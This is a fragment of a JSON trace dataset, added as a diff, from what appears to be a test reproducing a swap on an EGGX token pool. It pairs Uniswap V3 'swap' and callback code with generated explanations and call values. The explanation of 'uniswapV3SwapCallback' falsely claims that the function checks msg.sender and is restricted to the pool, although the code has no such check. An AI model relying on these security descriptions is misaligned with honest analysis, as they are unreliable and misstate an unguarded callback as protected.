state.amountSpecifiedRemaining,\n                fee\n            );\n\n            if (exactInput) {\n                state.amountSpecifiedRemaining -= (step.amountIn + step.feeAmount).toInt256();\n                state.amountCalculated = state.amountCalculated.sub(step.amountOut.toInt256());\n            } else {\n                state.amountSpecifiedRemaining += step.amountOut.toInt256();\n                state.amountCalculated = state.amountCalculated.add((step.amountIn + step.feeAmount).toInt256());\n            }\n\n            // if the protocol fee is on, calculate how much is owed, decrement feeAmount, and increment protocolFee\n            if (cache.feeProtocol > 0) {\n                uint256 delta = step.feeAmount / cache.feeProtocol;\n                step.feeAmount -= delta;\n                state.protocolFee += uint128(delta);\n            }\n\n            // update global fee tracker\n            if (state.liquidity > 0)\n                state.feeGrowthGlobalX128 += FullMath.mulDiv(step.feeAmount, FixedPoint128.Q128, state.liquidity);\n\n            // shift tick if we reached the next price\n            if (state.sqrtPriceX96 == step.sqrtPriceNextX96) {\n                // if the tick is initialized, run the tick transition\n                if (step.initialized) {\n                    // check for the placeholder value, which we replace with the actual value the first time the swap\n                    // crosses an initialized tick\n                    if (!cache.computedLatestObservation) {\n                        (cache.tickCumulative, cache.secondsPerLiquidityCumulativeX128) = observations.observeSingle(\n                            cache.blockTimestamp,\n                            0,\n                            slot0Start.tick,\n                            slot0Start.observationIndex,\n                            cache.liquidityStart,\n                            slot0Start.observationCardinality\n                        );\n                        cache.computedLatestObservation = true;\n                    }\n                    int128 liquidityNet =\n                        ticks.cross(\n                            step.tickNext,\n                            (zeroForOne ? state.feeGrowthGlobalX128 : feeGrowthGlobal0X128),\n                            (zeroForOne ? feeGrowthGlobal1X128 : state.feeGrowthGlobalX128),\n                            cache.secondsPerLiquidityCumulativeX128,\n                            cache.tickCumulative,\n                            cache.blockTimestamp\n                        );\n                    // if we're moving leftward, we interpret liquidityNet as the opposite sign\n                    // safe because liquidityNet cannot be type(int128).min\n                    if (zeroForOne) liquidityNet = -liquidityNet;\n\n                    state.liquidity = LiquidityMath.addDelta(state.liquidity, liquidityNet);\n                }\n\n                state.tick = zeroForOne ? step.tickNext - 1 : step.tickNext;\n            } else if (state.sqrtPriceX96 != step.sqrtPriceStartX96) {\n                // recompute unless we're on a lower tick boundary (i.e. already transitioned ticks), and haven't moved\n                state.tick = TickMath.getTickAtSqrtRatio(state.sqrtPriceX96);\n            }\n        }\n\n        // update tick and write an oracle entry if the tick change\n        if (state.tick != slot0Start.tick) {\n            (uint16 observationIndex, uint16 observationCardinality) =\n                observations.write(\n                    slot0Start.observationIndex,\n                    cache.blockTimestamp,\n                    slot0Start.tick,\n                    cache.liquidityStart,\n                    slot0Start.observationCardinality,\n                    slot0Start.observationCardinalityNext\n                );\n            (slot0.sqrtPriceX96, slot0.tick, slot0.observationIndex, slot0.observationCardinality) = (\n                state.sqrtPriceX96,\n                state.tick,\n                observationIndex,\n                observationCardinality\n            );\n        } else {\n            // otherwise just update the price\n            slot0.sqrtPriceX96 = state.sqrtPriceX96;\n        }\n\n        // update liquidity if it changed\n        if (cache.liquidityStart != state.liquidity) liquidity = state.liquidity;\n\n        // update fee growth global and, if necessary, protocol fees\n        // overflow is acceptable, protocol has to withdraw before it hits type(uint128).max fees\n        if (zeroForOne) {\n            feeGrowthGlobal0X128 = state.feeGrowthGlobalX128;\n            if (state.protocolFee > 0) protocolFees.token0 += state.protocolFee;\n        } else {\n            feeGrowthGlobal1X128 = state.feeGrowthGlobalX128;\n            if (state.protocolFee > 0) protocolFees.token1 += state.protocolFee;\n        }\n\n        (amount0, amount1) = zeroForOne == exactInput\n            ? (amountSpecified - state.amountSpecifiedRemaining, state.amountCalculated)\n            : (state.amountCalculated, amountSpecified - state.amountSpecifiedRemaining);\n\n        // do the transfers and collect payment\n        if (zeroForOne) {\n            if (amount1 < 0) TransferHelper.safeTransfer(token1, recipient, uint256(-amount1));\n\n            uint256 balance0Before = balance0();\n            IUniswapV3SwapCallback(msg.sender).uniswapV3SwapCallback(amount0, amount1, data);\n            require(balance0Before.add(uint256(amount0)) <= balance0(), 'IIA');\n        } else {\n            if (amount0 < 0) TransferHelper.safeTransfer(token0, recipient, uint256(-amount0));\n\n            uint256 balance1Before = balance1();\n            IUniswapV3SwapCallback(msg.sender).uniswapV3SwapCallback(amount0, amount1, data);\n            require(balance1Before.add(uint256(amount1)) <= balance1(), 'IIA');\n        }\n\n        emit Swap(msg.sender, recipient, amount0, amount1, state.sqrtPriceX96, state.liquidity, state.tick);\n        slot0.unlocked = true;\n    }\n\n    /// @inheritdoc IUniswapV3PoolActions\n",
+        "description": "1. **Core functions:**  \n   The `swap` function is designed to facilitate a token swap between two assets in a decentralized exchange (DEX) pool. It allows users to exchange one token for another based on the specified parameters, such as the direction of the swap, the amount to be swapped, and the price limits. The function calculates the exact amounts of tokens to be exchanged, updates the pool's state (e.g., liquidity, fees, and price), and ensures the swap is executed securely and efficiently.\n\n2. **Security mechanism:**  \n   - **`noDelegateCall`:** Prevents the function from being called through a delegate call, ensuring it runs in the correct context.  \n   - **`require` statements:** Enforce conditions such as non-zero swap amounts, unlocked pool state, and valid price limits to prevent invalid or malicious swaps.  \n   - **Locking mechanism:** Temporarily locks the pool during the swap to prevent reentrancy attacks or state corruption.  \n   - **Balance checks:** Verifies that the correct token amounts are transferred after the swap to ensure no funds are lost or misallocated.  \n\n3. **Parameter Function:**  \n   - **`recipient`:** The address that will receive the swapped tokens.  \n   - **`zeroForOne`:** A boolean indicating the direction of the swap (e.g., swapping token A for token B or vice versa).  \n   - **`amountSpecified`:** The amount of tokens the user wants to swap, which can be positive (exact input) or negative (exact output).  \n   - **`sqrtPriceLimitX96`:** A price limit to prevent the swap from executing at unfavorable prices.  \n   - **`data`:** Additional data passed to the callback function, often used for custom logic or verification.  \n\n4. **Return description:**  \n   The function returns two values, `amount0` and `amount1`, which represent the amounts of the two tokens involved in the swap. These values are calculated based on the remaining amount after the swap and the computed amounts during the swap process. The logic ensures that the user receives the correct amount of tokens according to the specified swap direction and price limits.  \n\n**In summary,**  \nThe `swap` function enables secure and efficient token swaps in a decentralized exchange pool. It uses various security measures to protect against invalid or malicious transactions, calculates the exact amounts of tokens to be exchanged, and updates the pool's state accordingly. The function's parameters define the swap details, and the return values reflect the outcome of the swap.",
+        "return_value": "0xffffffffffffffffffffffffffffffffffffffffffffffffe469c1b41a716e2c00000000000000000000000000000000000000000000354dea8b3f94d4470328"
+    },
+    {
+        "id": "25962",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 1987844781225447892 [1.987e18]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "565",
+        "args": "EGGX_Pool: [0x26beBB6995a4736F088D129E82620eBA899B944F]",
+        "original_code": null,
+        "description": null,
+        "return_value": "12128702757208325130521418 [1.212e25]"
+    },
+    {
+        "id": "152986",
+        "args": "-1987844781225447892 [-1.987e18], 251722723557701918851880 [2.517e23], 0x61",
+        "original_code": "    function uniswapV3SwapCallback(int256 amount0Delta, int256 amount1Delta, bytes calldata data) external {\n        if (amount0Delta > 0) {\n            IERC20(Uni_Pair_V3(msg.sender).token0()).transfer(msg.sender, uint256(amount0Delta));\n        } else if (amount1Delta > 0) {\n            IERC20(Uni_Pair_V3(msg.sender).token1()).transfer(msg.sender, uint256(amount1Delta));\n        }\n",
+        "description": "1. **Core function**:  \n   This function is a callback used in the Uniswap V3 protocol when a swap occurs. Its main role is to handle the transfer of tokens between the user and the Uniswap pool. Specifically, it checks which token (either `token0` or `token1`) is involved in the swap and transfers the required amount of that token to the Uniswap pool. This ensures that the pool receives the tokens it needs to complete the swap.\n\n2. **Security mechanism**:  \n   - The function uses the `external` modifier, which means it can only be called from outside the contract, ensuring it is triggered by the Uniswap protocol.  \n   - It verifies the sender (`msg.sender`) to ensure that only the Uniswap pool can call this function, preventing unauthorized access.  \n   - The function checks the values of `amount0Delta` and `amount1Delta` to ensure only positive amounts are processed, avoiding invalid or malicious inputs.  \n\n3. **Parameter Function**:  \n   - `amount0Delta`: Represents the amount of `token0` involved in the swap. If positive, it indicates that `token0` needs to be transferred to the pool.  \n   - `amount1Delta`: Represents the amount of `token1` involved in the swap. If positive, it indicates that `token1` needs to be transferred to the pool.  \n   - `data`: Additional data passed to the function, though it is not used in this specific implementation.  \n\n4. **Return description**:  \n   This function does not return any value. Instead, it performs a token transfer based on the values of `amount0Delta` and `amount1Delta`. If `amount0Delta` is positive, it transfers `token0` to the Uniswap pool. If `amount1Delta` is positive, it transfers `token1` to the Uniswap pool.  \n\nIn summary, this function ensures that the correct tokens are transferred to the Uniswap pool during a swap, while using security measures to prevent unauthorized or invalid operations.",
+        "return_value": "Returned"
+    },
+    {
+        "id": "308",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "EGGX: [0xe2f95ee8B72fFed59bC4D2F35b1d19b909A6e6b3]"
+    },
+    {
+        "id": "151262",
+        "args": "EGGX_Pool: [0x26beBB6995a4736F088D129E82620eBA899B944F], 251722723557701918851880 [2.517e23]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "565",
+        "args": "EGGX_Pool: [0x26beBB6995a4736F088D129E82620eBA899B944F]",
+        "original_code": null,
+        "description": null,
+        "return_value": "12380425480766027049373298 [1.238e25]"
+    },
+    {
+        "id": "534",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
+        "original_code": null,
+        "description": null,
+        "return_value": "1987844781225447892 [1.987e18]"
+    }
+]
